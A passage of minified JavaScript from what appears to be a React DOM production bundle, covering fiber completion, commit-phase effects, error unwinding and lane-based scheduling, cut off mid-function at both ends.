i=jo(Iu.current);if(t=e.type,n!==null&&e.stateNode!=null)pA(n,e,t,r,i),n.ref!==e.ref&&(e.flags|=512,e.flags|=2097152);else{if(!r){if(e.stateNode===null)throw Error(ae(166));return $n(e),null}if(n=jo(Si.current),Wh(e)){r=e.stateNode,t=e.type;var s=e.memoizedProps;switch(r[Ei]=e,r[_u]=s,n=(e.mode&1)!==0,t){case"dialog":Ct("cancel",r),Ct("close",r);break;case"iframe":case"object":case"embed":Ct("load",r);break;case"video":case"audio":for(i=0;i<Bc.length;i++)Ct(Bc[i],r);break;case"source":Ct("error",r);break;case"img":case"image":case"link":Ct("error",r),Ct("load",r);break;case"details":Ct("toggle",r);break;case"input":j_(r,s),Ct("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!s.multiple},Ct("invalid",r);break;case"textarea":F_(r,s),Ct("invalid",r)}Fm(t,s),i=null;for(var o in s)if(s.hasOwnProperty(o)){var a=s[o];o==="children"?typeof a=="string"?r.textContent!==a&&(s.suppressHydrationWarning!==!0&&zh(r.textContent,a,n),i=["children",a]):typeof a=="number"&&r.textContent!==""+a&&(s.suppressHydrationWarning!==!0&&zh(r.textContent,a,n),i=["children",""+a]):uu.hasOwnProperty(o)&&a!=null&&o==="onScroll"&&Ct("scroll",r)}switch(t){case"input":Lh(r),V_(r,s,!0);break;case"textarea":Lh(r),z_(r);break;case"select":case"option":break;default:typeof s.onClick=="function"&&(r.onclick=Gf)}r=i,e.updateQueue=r,r!==null&&(e.flags|=4)}else{o=i.nodeType===9?i:i.ownerDocument,n==="http://www.w3.org/1999/xhtml"&&(n=WS(t)),n==="http://www.w3.org/1999/xhtml"?t==="script"?(n=o.createElement("div"),n.innerHTML="<script><\/script>",n=n.removeChild(n.firstChild)):typeof r.is=="string"?n=o.createElement(t,{is:r.is}):(n=o.createElement(t),t==="select"&&(o=n,r.multiple?o.multiple=!0:r.size&&(o.size=r.size))):n=o.createElementNS(n,t),n[Ei]=e,n[_u]=r,dA(n,e,!1,!1),e.stateNode=n;e:{switch(o=zm(t,r),t){case"dialog":Ct("cancel",n),Ct("close",n),i=r;break;case"iframe":case"object":case"embed":Ct("load",n),i=r;break;case"video":case"audio":for(i=0;i<Bc.length;i++)Ct(Bc[i],n);i=r;break;case"source":Ct("error",n),i=r;break;case"img":case"image":case"link":Ct("error",n),Ct("load",n),i=r;break;case"details":Ct("toggle",n),i=r;break;case"input":j_(n,r),i=Om(n,r),Ct("invalid",n);break;case"option":i=r;break;case"select":n._wrapperState={wasMultiple:!!r.multiple},i=Kt({},r,{value:void 0}),Ct("invalid",n);break;case"textarea":F_(n,r),i=jm(n,r),Ct("invalid",n);break;default:i=r}Fm(t,i),a=i;for(s in a)if(a.hasOwnProperty(s)){var l=a[s];s==="style"?qS(n,l):s==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,l!=null&&$S(n,l)):s==="children"?typeof l=="string"?(t!=="textarea"||l!=="")&&hu(n,l):typeof l=="number"&&hu(n,""+l):s!=="suppressContentEditableWarning"&&s!=="suppressHydrationWarning"&&s!=="autoFocus"&&(uu.hasOwnProperty(s)?l!=null&&s==="onScroll"&&Ct("scroll",n):l!=null&&Uy(n,s,l,o))}switch(t){case"input":Lh(n),V_(n,r,!1);break;case"textarea":Lh(n),z_(n);break;case"option":r.value!=null&&n.setAttribute("value",""+oo(r.value));break;case"select":n.multiple=!!r.multiple,s=r.value,s!=null?ol(n,!!r.multiple,s,!1):r.defaultValue!=null&&ol(n,!!r.multiple,r.defaultValue,!0);break;default:typeof i.onClick=="function"&&(n.onclick=Gf)}switch(t){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(e.flags|=4)}e.ref!==null&&(e.flags|=512,e.flags|=2097152)}return $n(e),null;case 6:if(n&&e.stateNode!=null)gA(n,e,n.memoizedProps,r);else{if(typeof r!="string"&&e.stateNode===null)throw Error(ae(166));if(t=jo(Iu.current),jo(Si.current),Wh(e)){if(r=e.stateNode,t=e.memoizedProps,r[Ei]=e,(s=r.nodeValue!==t)&&(n=Rr,n!==null))switch(n.tag){case 3:zh(r.nodeValue,t,(n.mode&1)!==0);break;case 5:n.memoizedProps.suppressHydrationWarning!==!0&&zh(r.nodeValue,t,(n.mode&1)!==0)}s&&(e.flags|=4)}else r=(t.nodeType===9?t:t.ownerDocument).createTextNode(r),r[Ei]=e,e.stateNode=r}return $n(e),null;case 13:if(Nt(Wt),r=e.memoizedState,n===null||n.memoizedState!==null&&n.memoizedState.dehydrated!==null){if(jt&&kr!==null&&e.mode&1&&!(e.flags&128))PT(),El(),e.flags|=98560,s=!1;else if(s=Wh(e),r!==null&&r.dehydrated!==null){if(n===null){if(!s)throw Error(ae(318));if(s=e.memoizedState,s=s!==null?s.dehydrated:null,!s)throw Error(ae(317));s[Ei]=e}else El(),!(e.flags&128)&&(e.memoizedState=null),e.flags|=4;$n(e),s=!1}else ri!==null&&(I0(ri),ri=null),s=!0;if(!s)return e.flags&65536?e:null}return e.flags&128?(e.lanes=t,e):(r=r!==null,r!==(n!==null&&n.memoizedState!==null)&&r&&(e.child.flags|=8192,e.mode&1&&(n===null||Wt.current&1?gn===0&&(gn=3):_w())),e.updateQueue!==null&&(e.flags|=4),$n(e),null);case 4:return Sl(),p0(n,e),n===null&&wu(e.stateNode.containerInfo),$n(e),null;case 10:return rw(e.type._context),$n(e),null;case 17:return wr(e.type)&&Qf(),$n(e),null;case 19:if(Nt(Wt),s=e.memoizedState,s===null)return $n(e),null;if(r=(e.flags&128)!==0,o=s.rendering,o===null)if(r)kc(s,!1);else{if(gn!==0||n!==null&&n.flags&128)for(n=e.child;n!==null;){if(o=nd(n),o!==null){for(e.flags|=128,kc(s,!1),r=o.updateQueue,r!==null&&(e.updateQueue=r,e.flags|=4),e.subtreeFlags=0,r=t,t=e.child;t!==null;)s=t,n=r,s.flags&=14680066,o=s.alternate,o===null?(s.childLanes=0,s.lanes=n,s.child=null,s.subtreeFlags=0,s.memoizedProps=null,s.memoizedState=null,s.updateQueue=null,s.dependencies=null,s.stateNode=null):(s.childLanes=o.childLanes,s.lanes=o.lanes,s.child=o.child,s.subtreeFlags=0,s.deletions=null,s.memoizedProps=o.memoizedProps,s.memoizedState=o.memoizedState,s.updateQueue=o.updateQueue,s.type=o.type,n=o.dependencies,s.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext}),t=t.sibling;return Tt(Wt,Wt.current&1|2),e.child}n=n.sibling}s.tail!==null&&rn()>Al&&(e.flags|=128,r=!0,kc(s,!1),e.lanes=4194304)}else{if(!r)if(n=nd(o),n!==null){if(e.flags|=128,r=!0,t=n.updateQueue,t!==null&&(e.updateQueue=t,e.flags|=4),kc(s,!0),s.tail===null&&s.tailMode==="hidden"&&!o.alternate&&!jt)return $n(e),null}else 2*rn()-s.renderingStartTime>Al&&t!==1073741824&&(e.flags|=128,r=!0,kc(s,!1),e.lanes=4194304);s.isBackwards?(o.sibling=e.child,e.child=o):(t=s.last,t!==null?t.sibling=o:e.child=o,s.last=o)}return s.tail!==null?(e=s.tail,s.rendering=e,s.tail=e.sibling,s.renderingStartTime=rn(),e.sibling=null,t=Wt.current,Tt(Wt,r?t&1|2:t&1),e):($n(e),null);case 22:case 23:return vw(),r=e.memoizedState!==null,n!==null&&n.memoizedState!==null!==r&&(e.flags|=8192),r&&e.mode&1?Er&1073741824&&($n(e),e.subtreeFlags&6&&(e.flags|=8192)):$n(e),null;case 24:return null;case 25:return null}throw Error(ae(156,e.tag))}function iN(n,e){switch(Xy(e),e.tag){case 1:return wr(e.type)&&Qf(),n=e.flags,n&65536?(e.flags=n&-65537|128,e):null;case 3:return Sl(),Nt(yr),Nt(tr),lw(),n=e.flags,n&65536&&!(n&128)?(e.flags=n&-65537|128,e):null;case 5:return aw(e),null;case 13:if(Nt(Wt),n=e.memoizedState,n!==null&&n.dehydrated!==null){if(e.alternate===null)throw Error(ae(340));El()}return n=e.flags,n&65536?(e.flags=n&-65537|128,e):null;case 19:return Nt(Wt),null;case 4:return Sl(),null;case 10:return rw(e.type._context),null;case 22:case 23:return vw(),null;case 24:return null;default:return null}}var qh=!1,Jn=!1,sN=typeof WeakSet=="function"?WeakSet:Set,ye=null;function Xa(n,e){var t=n.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(r){en(n,e,r)}else t.current=null}function g0(n,e,t){try{t()}catch(r){en(n,e,r)}}var M1=!1;function oN(n,e){if(Jm=Hf,n=_T(),Zy(n)){if("selectionStart"in n)var t={start:n.selectionStart,end:n.selectionEnd};else e:{t=(t=n.ownerDocument)&&t.defaultView||window;var r=t.getSelection&&t.getSelection();if(r&&r.rangeCount!==0){t=r.anchorNode;var i=r.anchorOffset,s=r.focusNode;r=r.focusOffset;try{t.nodeType,s.nodeType}catch{t=null;break e}var o=0,a=-1,l=-1,u=0,h=0,f=n,m=null;t:for(;;){for(var v;f!==t||i!==0&&f.nodeType!==3||(a=o+i),f!==s||r!==0&&f.nodeType!==3||(l=o+r),f.nodeType===3&&(o+=f.nodeValue.length),(v=f.firstChild)!==null;)m=f,f=v;for(;;){if(f===n)break t;if(m===t&&++u===i&&(a=o),m===s&&++h===r&&(l=o),(v=f.nextSibling)!==null)break;f=m,m=f.parentNode}f=v}t=a===-1||l===-1?null:{start:a,end:l}}else t=null}t=t||{start:0,end:0}}else t=null;for(Xm={focusedElem:n,selectionRange:t},Hf=!1,ye=e;ye!==null;)if(e=ye,n=e.child,(e.subtreeFlags&1028)!==0&&n!==null)n.return=e,ye=n;else for(;ye!==null;){e=ye;try{var x=e.alternate;if(e.flags&1024)switch(e.tag){case 0:case 11:case 15:break;case 1:if(x!==null){var k=x.memoizedProps,I=x.memoizedState,S=e.stateNode,b=S.getSnapshotBeforeUpdate(e.elementType===e.type?k:ei(e.type,k),I);S.__reactInternalSnapshotBeforeUpdate=b}break;case 3:var E=e.stateNode.containerInfo;E.nodeType===1?E.textContent="":E.nodeType===9&&E.documentElement&&E.removeChild(E.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(ae(163))}}catch(U){en(e,e.return,U)}if(n=e.sibling,n!==null){n.return=e.return,ye=n;break}ye=e.return}return x=M1,M1=!1,x}function Jc(n,e,t){var r=e.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var i=r=r.next;do{if((i.tag&n)===n){var s=i.destroy;i.destroy=void 0,s!==void 0&&g0(e,t,s)}i=i.next}while(i!==r)}}function rp(n,e){if(e=e.updateQueue,e=e!==null?e.lastEffect:null,e!==null){var t=e=e.next;do{if((t.tag&n)===n){var r=t.create;t.destroy=r()}t=t.next}while(t!==e)}}function m0(n){var e=n.ref;if(e!==null){var t=n.stateNode;switch(n.tag){case 5:n=t;break;default:n=t}typeof e=="function"?e(n):e.current=n}}function mA(n){var e=n.alternate;e!==null&&(n.alternate=null,mA(e)),n.child=null,n.deletions=null,n.sibling=null,n.tag===5&&(e=n.stateNode,e!==null&&(delete e[Ei],delete e[_u],delete e[n0],delete e[zM],delete e[WM])),n.stateNode=null,n.return=null,n.dependencies=null,n.memoizedProps=null,n.memoizedState=null,n.pendingProps=null,n.stateNode=null,n.updateQueue=null}function yA(n){return n.tag===5||n.tag===3||n.tag===4}function N1(n){e:for(;;){for(;n.sibling===null;){if(n.return===null||yA(n.return))return null;n=n.return}for(n.sibling.return=n.return,n=n.sibling;n.tag!==5&&n.tag!==6&&n.tag!==18;){if(n.flags&2||n.child===null||n.tag===4)continue e;n.child.return=n,n=n.child}if(!(n.flags&2))return n.stateNode}}function y0(n,e,t){var r=n.tag;if(r===5||r===6)n=n.stateNode,e?t.nodeType===8?t.parentNode.insertBefore(n,e):t.insertBefore(n,e):(t.nodeType===8?(e=t.parentNode,e.insertBefore(n,t)):(e=t,e.appendChild(n)),t=t._reactRootContainer,t!=null||e.onclick!==null||(e.onclick=Gf));else if(r!==4&&(n=n.child,n!==null))for(y0(n,e,t),n=n.sibling;n!==null;)y0(n,e,t),n=n.sibling}function w0(n,e,t){var r=n.tag;if(r===5||r===6)n=n.stateNode,e?t.insertBefore(n,e):t.appendChild(n);else if(r!==4&&(n=n.child,n!==null))for(w0(n,e,t),n=n.sibling;n!==null;)w0(n,e,t),n=n.sibling}var Mn=null,ni=!1;function _s(n,e,t){for(t=t.child;t!==null;)wA(n,e,t),t=t.sibling}function wA(n,e,t){if(Ii&&typeof Ii.onCommitFiberUnmount=="function")try{Ii.onCommitFiberUnmount(Qd,t)}catch{}switch(t.tag){case 5:Jn||Xa(t,e);case 6:var r=Mn,i=ni;Mn=null,_s(n,e,t),Mn=r,ni=i,Mn!==null&&(ni?(n=Mn,t=t.stateNode,n.nodeType===8?n.parentNode.removeChild(t):n.removeChild(t)):Mn.removeChild(t.stateNode));break;case 18:Mn!==null&&(ni?(n=Mn,t=t.stateNode,n.nodeType===8?xg(n.parentNode,t):n.nodeType===1&&xg(n,t),gu(n)):xg(Mn,t.stateNode));break;case 4:r=Mn,i=ni,Mn=t.stateNode.containerInfo,ni=!0,_s(n,e,t),Mn=r,ni=i;break;case 0:case 11:case 14:case 15:if(!Jn&&(r=t.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){i=r=r.next;do{var s=i,o=s.destroy;s=s.tag,o!==void 0&&(s&2||s&4)&&g0(t,e,o),i=i.next}while(i!==r)}_s(n,e,t);break;case 1:if(!Jn&&(Xa(t,e),r=t.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=t.memoizedProps,r.state=t.memoizedState,r.componentWillUnmount()}catch(a){en(t,e,a)}_s(n,e,t);break;case 21:_s(n,e,t);break;case 22:t.mode&1?(Jn=(r=Jn)||t.memoizedState!==null,_s(n,e,t),Jn=r):_s(n,e,t);break;default:_s(n,e,t)}}function P1(n){var e=n.updateQueue;if(e!==null){n.updateQueue=null;var t=n.stateNode;t===null&&(t=n.stateNode=new sN),e.forEach(function(r){var i=gN.bind(null,n,r);t.has(r)||(t.add(r),r.then(i,i))})}}function Zr(n,e){var t=e.deletions;if(t!==null)for(var r=0;r<t.length;r++){var i=t[r];try{var s=n,o=e,a=o;e:for(;a!==null;){switch(a.tag){case 5:Mn=a.stateNode,ni=!1;break e;case 3:Mn=a.stateNode.containerInfo,ni=!0;break e;case 4:Mn=a.stateNode.containerInfo,ni=!0;break e}a=a.return}if(Mn===null)throw Error(ae(160));wA(s,o,i),Mn=null,ni=!1;var l=i.alternate;l!==null&&(l.return=null),i.return=null}catch(u){en(i,e,u)}}if(e.subtreeFlags&12854)for(e=e.child;e!==null;)vA(e,n),e=e.sibling}function vA(n,e){var t=n.alternate,r=n.flags;switch(n.tag){case 0:case 11:case 14:case 15:if(Zr(e,n),mi(n),r&4){try{Jc(3,n,n.return),rp(3,n)}catch(k){en(n,n.return,k)}try{Jc(5,n,n.return)}catch(k){en(n,n.return,k)}}break;case 1:Zr(e,n),mi(n),r&512&&t!==null&&Xa(t,t.return);break;case 5:if(Zr(e,n),mi(n),r&512&&t!==null&&Xa(t,t.return),n.flags&32){var i=n.stateNode;try{hu(i,"")}catch(k){en(n,n.return,k)}}if(r&4&&(i=n.stateNode,i!=null)){var s=n.memoizedProps,o=t!==null?t.memoizedProps:s,a=n.type,l=n.updateQueue;if(n.updateQueue=null,l!==null)try{a==="input"&&s.type==="radio"&&s.name!=null&&FS(i,s),zm(a,o);var u=zm(a,s);for(o=0;o<l.length;o+=2){var h=l[o],f=l[o+1];h==="style"?qS(i,f):h==="dangerouslySetInnerHTML"?$S(i,f):h==="children"?hu(i,f):Uy(i,h,f,u)}switch(a){case"input":Bm(i,s);break;case"textarea":zS(i,s);break;case"select":var m=i._wrapperState.wasMultiple;i._wrapperState.wasMultiple=!!s.multiple;var v=s.value;v!=null?ol(i,!!s.multiple,v,!1):m!==!!s.multiple&&(s.defaultValue!=null?ol(i,!!s.multiple,s.defaultValue,!0):ol(i,!!s.multiple,s.multiple?[]:"",!1))}i[_u]=s}catch(k){en(n,n.return,k)}}break;case 6:if(Zr(e,n),mi(n),r&4){if(n.stateNode===null)throw Error(ae(162));i=n.stateNode,s=n.memoizedProps;try{i.nodeValue=s}catch(k){en(n,n.return,k)}}break;case 3:if(Zr(e,n),mi(n),r&4&&t!==null&&t.memoizedState.isDehydrated)try{gu(e.containerInfo)}catch(k){en(n,n.return,k)}break;case 4:Zr(e,n),mi(n);break;case 13:Zr(e,n),mi(n),i=n.child,i.flags&8192&&(s=i.memoizedState!==null,i.stateNode.isHidden=s,!s||i.alternate!==null&&i.alternate.memoizedState!==null||(yw=rn())),r&4&&P1(n);break;case 22:if(h=t!==null&&t.memoizedState!==null,n.mode&1?(Jn=(u=Jn)||h,Zr(e,n),Jn=u):Zr(e,n),mi(n),r&8192){if(u=n.memoizedState!==null,(n.stateNode.isHidden=u)&&!h&&n.mode&1)for(ye=n,h=n.child;h!==null;){for(f=ye=h;ye!==null;){switch(m=ye,v=m.child,m.tag){case 0:case 11:case 14:case 15:Jc(4,m,m.return);break;case 1:Xa(m,m.return);var x=m.stateNode;if(typeof x.componentWillUnmount=="function"){r=m,t=m.return;try{e=r,x.props=e.memoizedProps,x.state=e.memoizedState,x.componentWillUnmount()}catch(k){en(r,t,k)}}break;case 5:Xa(m,m.return);break;case 22:if(m.memoizedState!==null){D1(f);continue}}v!==null?(v.return=m,ye=v):D1(f)}h=h.sibling}e:for(h=null,f=n;;){if(f.tag===5){if(h===null){h=f;try{i=f.stateNode,u?(s=i.style,typeof s.setProperty=="function"?s.setProperty("display","none","important"):s.display="none"):(a=f.stateNode,l=f.memoizedProps.style,o=l!=null&&l.hasOwnProperty("display")?l.display:null,a.style.display=HS("display",o))}catch(k){en(n,n.return,k)}}}else if(f.tag===6){if(h===null)try{f.stateNode.nodeValue=u?"":f.memoizedProps}catch(k){en(n,n.return,k)}}else if((f.tag!==22&&f.tag!==23||f.memoizedState===null||f===n)&&f.child!==null){f.child.return=f,f=f.child;continue}if(f===n)break e;for(;f.sibling===null;){if(f.return===null||f.return===n)break e;h===f&&(h=null),f=f.return}h===f&&(h=null),f.sibling.return=f.return,f=f.sibling}}break;case 19:Zr(e,n),mi(n),r&4&&P1(n);break;case 21:break;default:Zr(e,n),mi(n)}}function mi(n){var e=n.flags;if(e&2){try{e:{for(var t=n.return;t!==null;){if(yA(t)){var r=t;break e}t=t.return}throw Error(ae(160))}switch(r.tag){case 5:var i=r.stateNode;r.flags&32&&(hu(i,""),r.flags&=-33);var s=N1(n);w0(n,s,i);break;case 3:case 4:var o=r.stateNode.containerInfo,a=N1(n);y0(n,a,o);break;default:throw Error(ae(161))}}catch(l){en(n,n.return,l)}n.flags&=-3}e&4096&&(n.flags&=-4097)}function aN(n,e,t){ye=n,_A(n)}function _A(n,e,t){for(var r=(n.mode&1)!==0;ye!==null;){var i=ye,s=i.child;if(i.tag===22&&r){var o=i.memoizedState!==null||qh;if(!o){var a=i.alternate,l=a!==null&&a.memoizedState!==null||Jn;a=qh;var u=Jn;if(qh=o,(Jn=l)&&!u)for(ye=i;ye!==null;)o=ye,l=o.child,o.tag===22&&o.memoizedState!==null?O1(i):l!==null?(l.return=o,ye=l):O1(i);for(;s!==null;)ye=s,_A(s),s=s.sibling;ye=i,qh=a,Jn=u}L1(n)}else i.subtreeFlags&8772&&s!==null?(s.return=i,ye=s):L1(n)}}function L1(n){for(;ye!==null;){var e=ye;if(e.flags&8772){var t=e.alternate;try{if(e.flags&8772)switch(e.tag){case 0:case 11:case 15:Jn||rp(5,e);break;case 1:var r=e.stateNode;if(e.flags&4&&!Jn)if(t===null)r.componentDidMount();else{var i=e.elementType===e.type?t.memoizedProps:ei(e.type,t.memoizedProps);r.componentDidUpdate(i,t.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var s=e.updateQueue;s!==null&&w1(e,s,r);break;case 3:var o=e.updateQueue;if(o!==null){if(t=null,e.child!==null)switch(e.child.tag){case 5:t=e.child.stateNode;break;case 1:t=e.child.stateNode}w1(e,o,t)}break;case 5:var a=e.stateNode;if(t===null&&e.flags&4){t=a;var l=e.memoizedProps;switch(e.type){case"button":case"input":case"select":case"textarea":l.autoFocus&&t.focus();break;case"img":l.src&&(t.src=l.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(e.memoizedState===null){var u=e.alternate;if(u!==null){var h=u.memoizedState;if(h!==null){var f=h.dehydrated;f!==null&&gu(f)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(ae(163))}Jn||e.flags&512&&m0(e)}catch(m){en(e,e.return,m)}}if(e===n){ye=null;break}if(t=e.sibling,t!==null){t.return=e.return,ye=t;break}ye=e.return}}function D1(n){for(;ye!==null;){var e=ye;if(e===n){ye=null;break}var t=e.sibling;if(t!==null){t.return=e.return,ye=t;break}ye=e.return}}function O1(n){for(;ye!==null;){var e=ye;try{switch(e.tag){case 0:case 11:case 15:var t=e.return;try{rp(4,e)}catch(l){en(e,t,l)}break;case 1:var r=e.stateNode;if(typeof r.componentDidMount=="function"){var i=e.return;try{r.componentDidMount()}catch(l){en(e,i,l)}}var s=e.return;try{m0(e)}catch(l){en(e,s,l)}break;case 5:var o=e.return;try{m0(e)}catch(l){en(e,o,l)}}}catch(l){en(e,e.return,l)}if(e===n){ye=null;break}var a=e.sibling;if(a!==null){a.return=e.return,ye=a;break}ye=e.return}}var lN=Math.ceil,sd=ps.ReactCurrentDispatcher,gw=ps.ReactCurrentOwner,Hr=ps.ReactCurrentBatchConfig,Je=0,An=null,hn=null,Un=0,Er=0,el=mo(0),gn=0,bu=null,Xo=0,ip=0,mw=0,Xc=null,dr=null,yw=0,Al=1/0,Fi=null,od=!1,v0=null,Gs=null,Kh=!1,Os=null,ad=0,eu=0,_0=null,Ef=-1,If=0;function sr(){return Je&6?rn():Ef!==-1?Ef:Ef=rn()}function Qs(n){return n.mode&1?Je&2&&Un!==0?Un&-Un:HM.transition!==null?(If===0&&(If=iT()),If):(n=ft,n!==0||(n=window.event,n=n===void 0?16:hT(n.type)),n):1}function li(n,e,t,r){if(50<eu)throw eu=0,_0=null,Error(ae(185));Zu(n,t,r),(!(Je&2)||n!==An)&&(n===An&&(!(Je&2)&&(ip|=t),gn===4&&Rs(n,Un)),vr(n,r),t===1&&Je===0&&!(e.mode&1)&&(Al=rn()+500,ep&&yo()))}function vr(n,e){var t=n.callbackNode;HR(n,e);var r=$f(n,n===An?Un:0);if(r===0)t!==null&&H_(t),n.callbackNode=null,n.callbackPriority=0;else if(e=r&-r,n.callbackPriority!==e){if(t!=null&&H_(t),e===1)n.tag===0?$M(B1.bind(null,n)):RT(B1.bind(null,n)),VM(function(){!(Je&6)&&yo()}),t=null;else{switch(sT(r)){case 1:t=Wy;break;case 4:t=nT;break;case 16:t=Wf;break;case 536870912:t=rT;break;default:t=Wf}t=kA(t,EA.bind(null,n))}n.callbackPriority=e,n.callbackNode=t}}function EA(n,e){if(Ef=-1,If=0,Je&6)throw Error(ae(327));var t=n.callbackNode;if(hl()&&n.callbackNode!==t)return null;var r=$f(n,n===An?Un:0);if(r===0)return null;if(r&30||r&n.expiredLanes||e)e=ld(n,r);else{e=r;var i=Je;Je|=2;var s=SA();(An!==n||Un!==e)&&(Fi=null,Al=rn()+500,qo(n,e));do try{hN();break}catch(a){IA(n,a)}while(1);nw(),sd.current=s,Je=i,hn!==null?e=0:(An=null,Un=0,e=gn)}if(e!==0){if(e===2&&(i=Km(n),i!==0&&(r=i,e=E0(n,i))),e===1)throw t=bu,qo(n,0),Rs(n,r),vr(n,rn()),t;if(e===6)Rs(n,r);else{if(i=n.current.alternate,!(r&30)&&!cN(i)&&(e=ld(n,r),e===2&&(s=Km(n),s!==0&&(r=s,e=E0(n,s))),e===1))throw t=bu,qo(n,0),Rs(n,r),vr(n,rn()),t;switch(n.finishedWork=i,n.finishedLanes=r,e){case 0:case 1:throw Error(ae(345));case 2:Ro(n,dr,Fi);break;case 3:if(Rs(n,r),(r&130023424)===r&&(e=yw+500-rn(),10<e)){if($f(n,0)!==0)break;if(i=n.suspendedLanes,(i&r)!==r){sr(),n.pingedLanes|=n.suspendedLanes&i;break}n.timeoutHandle=t0(Ro.bind(null,n,dr,Fi),e);break}Ro(n,dr,Fi);break;case 4:if(Rs(n,r),(r&4194240)===r)break;for(e=n.eventTimes,i=-1;0<r;){var o=31-ai(r);s=1<<o,o=e[o],o>i&&(i=o),r&=~s}if(r=i,r=rn()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*lN(r/1960))-r,10<r){n.timeoutHandle=t0(Ro.bind(null,n,dr,Fi),r);break}Ro(n,dr,Fi);break;case 5:Ro(n,dr,Fi);break;default:throw Error(ae(329))}}}return vr(n,rn()),n.callbackNode===t?EA.bind(null,n):null}function E0(n,e){var t=Xc;return n.current.memoizedState.isDehydrated&&(qo(n,e).flags|=256),n=ld(n,e),n!==2&&(e=dr,dr=t,e!==null&&I0(e)),n}function I0(n){dr===null?dr=n:dr.push.apply(dr,n)}function cN(n){for(var e=n;;){if(e.flags&16384){var t=e.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var r=0;r<t.length;r++){var i=t[r],s=i.getSnapshot;i=i.value;try{if(!fi(s(),i))return!1}catch{return!1}}}if(t=e.child,e.subtreeFlags&16384&&t!==null)t.return=e,e=t;else{if(e===n)break;for(;e.sibling===null;){if(e.return===null||e.return===n)return!0;e=e.return}e.sibling.return=e.return,e=e.sibling}}return!0}function Rs(n,e){for(e&=~mw,e&=~ip,n.suspendedLanes|=e,n.pingedLanes&=~e,n=n.expirationTimes;0<e;){var t=31-ai(e),r=1<<t;n[t]=-1,e&=~r}}function B1(n){if(Je&6)throw Error(ae(327));hl();var e=$f(n,0);if(!(e&1))return vr(n,rn()),null;var t=ld(n,e);if(n.tag!==0&&t===2){var r=Km(n);r!==0&&(e=r,t=E0(n,r))}if(t===1)throw t=bu,qo(n,0),Rs(n,e),vr(n,rn()),t;if(t===6)throw Error(ae(345));return n.finishedWork=n.current.alternate,n.finishedLanes=e,Ro(n,dr,Fi),vr(n,rn()),null}function ww(n,e){var t=Je;Je|=1;try{return n(e)}finally{Je=t,Je===0&&(Al=rn()+500,ep&&yo())}}function ea(n){Os!==null&&Os.tag===0&&!(Je&6)&&hl();var e=Je;Je|=1;var t=Hr.transition,r=ft;try{if(Hr.transition=null,ft=1,n)return n()}finally{ft=r,Hr.transition=t,Je=e,!(Je&6)&&yo()}}function vw(){Er=el.current,Nt(el)}function qo(n,e){n.finishedWork=null,n.finishedLanes=0;var t=n.timeoutHandle;if(t!==-1&&(n.timeoutHandle=-1,jM(t)),hn!==null)for(t=hn.return;t!==null;){var r=t;switch(Xy(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&Qf();break;case 3:Sl(),Nt(yr),Nt(tr),lw();break;case 5:aw(r);break;case 4:Sl();break;case 13:Nt(Wt);break;case 19:Nt(Wt);break;case 10:rw(r.type._context);break;case 22:case 23:vw()}t=t.return}if(An=n,hn=n=Ys(n.current,null),Un=Er=e,gn=0,bu=null,mw=ip=Xo=0,dr=Xc=null,Uo!==null){for(e=0;e<Uo.length;e++)if(t=Uo[e],r=t.interleaved,r!==null){t.interleaved=null;var i=r.next,s=t.pending;if(s!==null){var o=s.next;s.next=i,r.next=o}t.pending=r}Uo=null}return n}function IA(n,e){do{var t=hn;try{if(nw(),wf.current=id,rd){for(var r=qt.memoizedState;r!==null;){var i=r.queue;i!==null&&(i.pending=null),r=r.next}rd=!1}if(Jo=0,Sn=pn=qt=null,Zc=!1,Su=0,gw.current=null,t===null||t.return===null){gn=1,bu=e,hn=null;break}e:{var s=n,o=t.return,a=t,l=e;if(e=Un,a.flags|=32768,l!==null&&typeof l=="object"&&typeof l.then=="function"){var u=l,h=a,f=h.tag;if(!(h.mode&1)&&(f===0||f===11||f===15)){var m=h.alternate;m?(h.updateQueue=m.updateQueue,h.memoizedState=m.memoizedState,h.lanes=m.lanes):(h.updateQueue=null,h.memoizedState=null)}var v=T1(o);if(v!==null){v.flags&=-257,A1(v,o,a,s,e),v.mode&1&&S1(s,u,e),e=v,l=u;var x=e.updateQueue;if(x===null){var k=new Set;k.add(l),e.updateQueue=k}else x.add(l);break e}else{if(!(e&1)){S1(s,u,e),_w();break e}l=Error(ae(426))}}else if(jt&&a.mode&1){var I=T1(o);if(I!==null){!(I.flags&65536)&&(I.flags|=256),A1(I,o,a,s,e),ew(Tl(l,a));break e}}s=l=Tl(l,a),gn!==4&&(gn=2),Xc===null?Xc=[s]:Xc.push(s),s=o;do{switch(s.tag){case 3:s.flags|=65536,e&=-e,s.lanes|=e;var S=sA(s,l,e);y1(s,S);break e;case 1:a=l;var b=s.type,E=s.stateNode;if(!(s.flags&128)&&(typeof b.getDerivedStateFromError=="function"||E!==null&&typeof E.componentDidCatch=="function"&&(Gs===null||!Gs.has(E)))){s.flags|=65536,e&=-e,s.lanes|=e;var U=oA(s,a,e);y1(s,U);break e}}s=s.return}while(s!==null)}AA(t)}catch(H){e=H,hn===t&&t!==null&&(hn=t=t.return);continue}break}while(1)}function SA(){var n=sd.current;return sd.current=id,n===null?id:n}function _w(){(gn===0||gn===3||gn===2)&&(gn=4),An===null||!(Xo&268435455)&&!(ip&268435455)||Rs(An,Un)}function ld(n,e){var t=Je;Je|=2;var r=SA();(An!==n||Un!==e)&&(Fi=null,qo(n,e));do try{uN();break}catch(i){IA(n,i)}while(1);if(nw(),Je=t,sd.current=r,hn!==null)throw Error(ae(261));return An=null,Un=0,gn}function uN(){for(;hn!==null;)TA(hn)}function hN(){for(;hn!==null&&!OR();)TA(hn)}function TA(n){var 